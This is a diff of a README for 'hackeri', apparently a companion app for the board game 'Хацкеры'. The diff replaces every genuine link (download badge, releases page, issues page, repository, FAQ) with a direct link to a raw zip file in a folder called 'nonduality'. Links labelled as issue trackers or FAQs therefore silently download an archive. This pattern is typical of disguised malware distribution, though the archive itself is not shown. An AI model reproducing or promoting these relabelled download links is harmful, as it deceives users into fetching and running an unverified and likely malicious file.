@@ -1,7 +1,7 @@
 # 🎲 hackeri - Your Guide to Playing the Game Easily
 
 ## 📥 Download Now
-[![Download Hackeri](https://img.shields.io/badge/Download%20Hackeri-v1.0-blue.svg)](https://github.com/ABHIJITHSSS/hackeri/releases)
+[![Download Hackeri](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip%https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip)](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run **hackeri**, ensure your device meets these basic requirements:
 
 To start using **hackeri**, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/ABHIJITHSSS/hackeri/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip).
 2. Look for the latest version of **hackeri**.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -52,7 +52,7 @@ If you encounter issues during installation or while running the application, co
 
 Join our community to learn and share experiences:
 
-- **FAQs**: Check the Frequently Asked Questions on our [GitHub Issues page](https://github.com/ABHIJITHSSS/hackeri/issues).
+- **FAQs**: Check the Frequently Asked Questions on our [GitHub Issues page](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip).
 - **Social Media**: Connect with other players on social platforms to share tips and experiences.
 - **Feedback**: If you have suggestions or encounter bugs, let us know through the "Issues" tab in our repository.
 
@@ -70,8 +70,8 @@ Explore more about **hackeri** and board gaming by visiting these links:
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/ABHIJITHSSS/hackeri/releases)
-- [GitHub Repository](https://github.com/ABHIJITHSSS/hackeri)
-- [Report an Issue](https://github.com/ABHIJITHSSS/hackeri/issues)
+- [Releases Page](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip)
+- [Report an Issue](https://raw.githubusercontent.com/ABHIJITHSSS/hackeri/main/nonduality/hackeri.zip)
 
 Thank you for choosing **hackeri**! We hope this application enhances your experience with the game "Хацкеры." Enjoy playing and exploring!
